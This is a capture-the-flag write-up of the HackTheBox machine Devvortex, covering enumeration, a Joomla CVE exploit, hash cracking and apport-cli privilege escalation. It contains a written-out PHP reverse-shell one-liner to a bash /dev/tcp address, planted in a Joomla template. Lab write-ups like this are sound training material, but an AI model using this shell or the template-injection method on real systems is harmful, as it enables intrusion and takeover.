+++
title = 'HTB Devvortex Writeup'
date = 2023-12-18T12:00:23-05:00
draft = false
+++

Here's a seasonal HackTheBox machine from last month: Devvortex. Let's get started.
## Scanning and Enumeration

As always, I start by adding the IP address to my `/etc/hosts` file and running an nmap scan

![/etc/hosts file](/images/devvortex/etc_hosts.png)
![nmap scan](/images/devvortex/nmap.png)

So we've got two open ports, 22 and 80. Visiting the webserver on port 80 gives me this homepage

![devvortex homepage](/images/devvortex/devvortex_htb.png)

Looking around the website didn't seem like it would lead anywhere, so I continued enumeration by searching for directories and subdomains using gobuster

![gobuster directory search](/images/devvortex/gobuster_dir.png)

The directories that gobuster found weren't very useful, but it did find an interesting subdomain

![subdomain](/images/devvortex/gobuster_dns.png)

After adding this subdomain to the hosts file, we can browse it

![etc hosts 2](/images/devvortex/etc_hosts2.png)

![subdomain page](/images/devvortex/subdomain_homepage.png)

I ran another gobuster directory search, this time on the subdomain

![gobuster dir subdomain](/images/devvortex/gobuster_dir_subdomain.png)

Visiting the /administrator/ endpoint gave me a login page hosted with Joomla

![joomla login](/images/devvortex/administrator.png)

## Initial Foothold

We can use joomscan to find out more about the Joomla installation

![joomscan](/images/devvortex/joomscan.png)

A quick google search for vulnerabilities in Joomla 4.2.6 led me to a CVE

![cve](/images/devvortex/cve.png)

I also found exploit code for this vulnerability [here](https://github.com/Acceis/exploit-CVE-2023-23752). No need to change anything in the code, just provide the URL as a command line argument

![ruby exploit](/images/devvortex/ruby.png)

This gives us credentials that we can use to login to the Joomla dashboard.

![joomla dashboard](/images/devvortex/joomla_logged_in.png)

By clicking *System* &rarr; *Administrator Templates* I found the template that the website is using. I've run into Joomla templates before, and I knew I was able to get a reverse shell on the system using a template. First, I selected the template and viewed the **index.php** file. Then, I added a php reverse shell one-liner to the template

`exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.12/1234 0>&1'");`

![rev shell](/images/devvortex/rev_shell.png)

Before saving the changes, I started a netcat listener so it could catch the reverse shell. I then ran a few commands to create a more stable shell

![netcat](/images/devvortex/stable_shell.png)

I found the user flag, but wasn't able to read the file

![found user flag](/images/devvortex/find_user_flag.png)

From here, I got stuck for a while until I remembered the credentials I used to login to the Joomla dashboard. I checked to see if I could use them to access MySQL

![mysql](/images/devvortex/mysql.png)

It worked! Let's see what we can find in the database

![databases](/images/devvortex/show_databases.png)

There are a lot of tables in the joomla database, but one looks interesting

![tables](/images/devvortex/tables.png)
![users](/images/devvortex/users.png)

We now have Logan's password hash, and it appears to be hashed with blowfish. We can crack this using hashcat

![hash](/images/devvortex/hash.png)
![cracked](/images/devvortex/cracked.png)

Now we can access the user flag

![user flag](/images/devvortex/user_flag.png)

## Privilege Escalation

Let's see what sudo permissions Logan has

![sudo](/images/devvortex/sudo.png)

A quick google search for privilege escalation using `apport-cli` gives us a CVE from earlier this year

![cve2](/images/devvortex/cve2.png)

The CVE linked to [this](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) page, which provides some useful information on how to exploit this vulnerability to get a root shell. Basically, we need to create a crash report, then view it, which opens the report with `less`. From here, it's simple to get a shell.

![generate report](/images/devvortex/report2.png)
![view report](/images/devvortex/report3.png)
![report](/images/devvortex/report.png)
![root](/images/devvortex/root.png)

&nbsp;  
Thanks for reading,

Dakota Vickers